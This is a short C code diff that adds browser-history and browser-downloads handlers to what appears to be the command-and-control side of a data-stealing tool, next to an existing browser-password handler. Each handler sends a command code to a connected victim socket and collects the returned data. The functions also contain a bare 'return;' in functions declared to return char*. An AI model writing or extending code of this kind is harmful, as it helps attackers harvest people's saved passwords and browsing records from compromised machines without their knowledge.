@@ -194,3 +194,21 @@ char* browser_password_handle(sock_t client_fd) {
     char* res = (char*)safe_recv(client_fd, NULL, NULL, 0);
     return res;
 }
+
+char* browser_history_handle(sock_t client_fd) {
+    // This one doesnt require payload from server
+    int dummy = 0;
+    if (safe_send(client_fd, &dummy, BROWSER_HISTORY_CMD, sizeof(int), 0) <= 0) return;
+
+    char* res = (char*)safe_recv(client_fd, NULL, NULL, 0);
+    return res;
+}
+
+char* browser_downloads_handle(sock_t client_fd) {
+    // This one doesnt require payload from server
+    int dummy = 0;
+    if (safe_send(client_fd, &dummy, BROWSER_DL_CMD, sizeof(int), 0) <= 0) return;
+
+    char* res = (char*)safe_recv(client_fd, NULL, NULL, 0);
+    return res;
+}
